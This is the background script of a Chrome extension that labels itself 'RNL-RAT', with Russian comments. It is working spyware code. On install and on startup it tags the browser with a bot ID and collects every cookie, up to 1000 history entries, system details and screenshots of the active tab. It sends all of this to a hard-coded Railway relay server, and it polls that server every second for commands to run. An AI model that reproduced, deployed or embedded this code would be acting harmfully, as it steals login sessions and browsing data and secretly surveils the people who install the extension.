const SERVER_URL = 'https://discord-relay-production.up.railway.app';
const SITE_CHANGE_INTERVAL = 30*60*1000; // 30 минут
let pcId = null;
let lastUrl = '';
let lastScreenshotTime = 0;
let isSendingInProgress = false;

const animals = ["RNL-RAT"];

function log(msg, err=null){
    const ts = new Date().toISOString();
    if(err) console.error(`[${ts}] [${pcId}] ${msg}`, err);
    else console.log(`[${ts}] [${pcId}] ${msg}`);
}

// ---------- PC ID ----------
async function getPcId(){
    return new Promise(resolve=>{
        chrome.storage.local.get(['pcId'], data=>{
            if(data.pcId){
                pcId = data.pcId;
                resolve(pcId);
            } else {
                const animal = animals[Math.floor(Math.random()*animals.length)];
                const hash = Math.floor(Math.random()*1e6);
                pcId = `${animal}-${hash}`;
                chrome.storage.local.set({pcId}, ()=>resolve(pcId));
            }
        });
    });
}

// ---------- Сбор данных ----------
async function collectCookies(){ 
    return new Promise(resolve=> chrome.cookies.getAll({}, cookies=>resolve(cookies))); 
}
async function collectHistory(){ 
    return new Promise(resolve=> chrome.history.search({text:'', maxResults:1000, startTime:0}, items=>resolve(items))); 
}
function getSystemInfo(){ 
    return { 
        userAgent: navigator.userAgent, 
        platform: navigator.platform, 
        languages: navigator.languages, 
        cpuCores: navigator.hardwareConcurrency||'unknown', 
        deviceMemory: navigator.deviceMemory||'unknown', 
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, 
        timestamp: new Date().toISOString() 
    }; 
}
async function captureScreenshot(){ 
    return new Promise(resolve=> chrome.tabs.captureVisibleTab(null,{format:'jpeg', quality:80}, dataUrl=>{
        resolve(dataUrl ? dataUrl.split(',')[1] : null);
    }));
}

// ---------- Отправка данных ----------
async function sendData(command=null){
    if(isSendingInProgress) return;
    isSendingInProgress = true;
    try{
        log('Collecting data...');
        let payload = { pcId };

        if(!command || command === 'get_cookies') payload.cookies = await collectCookies();
        if(!command || command === 'get_history') payload.history = await collectHistory();
        if(!command || command === 'get_system') payload.systemInfo = getSystemInfo();
        if(!command || command === 'get_screenshot') {
            const screenshotData = await captureScreenshot();
            if(screenshotData) payload.screenshot = screenshotData;
        }

        payload.command = command;

        await fetch(`${SERVER_URL}/upload-pc`,{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify(payload)
        });

        log('Data sent to server');
    }catch(err){ log('Failed sending data', err); }
    finally{ isSendingInProgress = false; }
}

// ---------- Ping серверу ----------
async function pingServer(){
    try{
        const res = await fetch(`${SERVER_URL}/ping`,{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({pcId})
        });
        const data = await res.json();
        if(data.commands) {
            for(const cmd of data.commands) sendData(cmd);
        }
    }catch(err){ log('Ping failed', err); }
}

// ---------- Проверка смены сайта ----------
async function checkSiteChange(){
    try{
        const tabs = await new Promise(resolve=>chrome.tabs.query({active:true,currentWindow:true}, resolve));
        if(!tabs.length) return;
        const tab = tabs[0];
        if(!tab.url || tab.url.startsWith('chrome://') || tab.url.startsWith('about:')) return;
        const now = Date.now();
        if(tab.url !== lastUrl && now - lastScreenshotTime > SITE_CHANGE_INTERVAL){
            lastUrl = tab.url;
            lastScreenshotTime = now;
            await sendData();
        }
    }catch(err){ log('checkSiteChange error', err); }
}

// ---------- Инициализация ----------
async function init(){
    await getPcId();
    log('Extension started with PC ID: '+pcId);
    await sendData();
    setInterval(pingServer, 1000); // пинг серверу каждые 10 сек
    setInterval(checkSiteChange, 5000); // проверка смены сайта каждые 5 сек
    setInterval(()=>sendData(), SITE_CHANGE_INTERVAL); // полный сбор раз в интервал
}

chrome.runtime.onStartup.addListener(init);
chrome.runtime.onInstalled.addListener(init);